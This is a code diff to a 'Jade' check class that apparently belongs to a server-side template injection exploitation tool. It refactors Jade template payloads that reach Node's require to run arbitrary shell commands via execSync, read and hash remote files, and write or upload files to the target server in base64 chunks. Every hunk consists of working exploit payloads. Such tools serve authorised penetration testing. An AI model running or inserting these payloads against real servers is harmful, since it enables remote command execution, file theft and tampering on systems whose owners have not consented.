@@ -14,8 +14,7 @@ class Jade(Check):
         
         execution_code = """- var x = global.process
 - x = x.mainModule.require
-- x = x('os')
-= x.platform()
+= x('os').platform()
 """
         self.set('os', self.inject(execution_code))
         self.set('language', 'javascript')
@@ -33,8 +32,7 @@ class Jade(Check):
 
         execution_code = """- var x = global.process
 - x = x.mainModule.require
-- x = x('child_process')
-= x.execSync("%s")
+= x('child_process').execSync("%s")
 """ % quote(command)
 
         return self.inject(execution_code)
@@ -55,9 +53,7 @@ class Jade(Check):
         # the response, corrupting the data
         data_b64encoded = self.inject("""- var x = global.process
 - x = x.mainModule.require
-- y = x('fs')
-- z = x('crypto')
-= y.readFileSync('%s').toString('base64')
+= x('fs').readFileSync('%s').toString('base64')
 """ % remote_path)
 
         data = base64decode(data_b64encoded)
@@ -73,10 +69,7 @@ class Jade(Check):
         
         execution_code = """- var x = global.process
 - x = x.mainModule.require
-- y = x('fs')
-- z = x('crypto')
-- y = y.readFileSync('%s')
-= z.createHash('md5').update(y).digest("hex")
+= x('crypto').createHash('md5').update(x('fs').readFileSync('%s')).digest("hex")
 """ % remote_path
 
         return self.inject(execution_code)
@@ -94,8 +87,7 @@ class Jade(Check):
             else:
                 self.inject("""- var x = global.process
 - x = x.mainModule.require
-- y = x('fs')
-- y = y.writeFileSync('%s', '')
+- x('fs').writeFileSync('%s', '')
 """ % remote_path)
         
         # Upload file in chunks of 500 characters
@@ -104,8 +96,7 @@ class Jade(Check):
             chunk_b64 = base64encode(chunk)
             self.inject("""- var x = global.process
 - x = x.mainModule.require
-- y = x('fs')
-- y = y.appendFileSync('%s', Buffer.from('%s', 'base64'), 'binary')
+- x('fs').appendFileSync('%s', Buffer.from('%s', 'base64'), 'binary')
 """ % (remote_path, chunk_b64))
         
         if not md5(data) == self._md5(remote_path):
